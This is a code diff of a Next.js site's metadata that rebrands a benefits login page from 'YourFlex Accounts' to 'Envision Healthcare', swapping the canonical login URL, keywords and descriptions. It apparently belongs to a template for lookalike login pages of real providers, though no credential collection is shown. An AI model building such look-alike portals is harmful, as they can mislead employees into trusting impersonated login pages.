@@ -7,41 +7,40 @@ import "./globals.css";
 const geist = Geist({ subsets: ["latin"] });
 
 const CANONICAL_LOGIN_URL =
-  "https://yourflexaccounts.aptia365.com/Authentication/Handshake";
-const SITE_DOMAIN = "yourflexaccounts.aptia365.com";
-const SITE_BRAND = "YourFlex Accounts";
+  "https://envisionhealthcare.wealthcareportal.com/Authentication/Handshake";
+const SITE_DOMAIN = "envisionhealthcare.wealthcareportal.com";
+const SITE_BRAND = "Envision Healthcare";
 
 export const metadata: Metadata = {
   metadataBase: new URL(
     process.env.NEXT_PUBLIC_BASE_URL || CANONICAL_LOGIN_URL,
   ),
   title: {
-    default: "YourFlex Accounts - Login",
-    template: "%s | YourFlex Accounts",
+    default: "Envision Healthcare - Login",
+    template: "%s | Envision Healthcare",
   },
   keywords: [
-    "YourFlex Accounts",
-    "Aptia 365",
-    "yourflexaccounts.aptia365.com",
+    "Envision Healthcare",
+    "Envision Portal",
+    "envisionhealthcare.wealthcareportal.com",
     "benefits login",
     "employee benefits portal",
-    "FSA login",
-    "HSA login",
-    "COBRA login",
+    "healthcare login",
     "account access",
     "health benefits",
-    "dependent care",
-    "reimbursement account",
     "secure login",
     "participant portal",
-    "employer portal",
-    "handshake authentication"
+    "healthcare portal",
+    "benefits management",
+    "envision benefits",
+    "wealthcare portal",
+    "employee health"
   ],
-  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+  description: `${SITE_BRAND} – ${SITE_DOMAIN}. Access your account, manage your health benefits, and sign in securely through Envision Healthcare.`,
 
-  authors: [{ name: "YourFlex Accounts" }],
-  creator: "YourFlex Accounts",
-  publisher: "YourFlex Accounts",
+  authors: [{ name: "Envision Healthcare" }],
+  creator: "Envision Healthcare",
+  publisher: "Envision Healthcare",
   applicationName: SITE_BRAND,
   referrer: "origin-when-cross-origin",
   robots: {
@@ -58,8 +57,8 @@ export const metadata: Metadata = {
   openGraph: {
     type: "website",
     locale: "en_US",
-    title: "YourFlex Accounts - Login",
-    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health and dependent care benefits, and sign in securely through YourFlex Accounts.`,
+    title: "Envision Healthcare - Login",
+    description: `${SITE_BRAND} at ${SITE_DOMAIN}. Access your account, manage your health benefits, and sign in securely through Envision Healthcare.`,
     siteName: SITE_BRAND,
     url: CANONICAL_LOGIN_URL,
     images: [
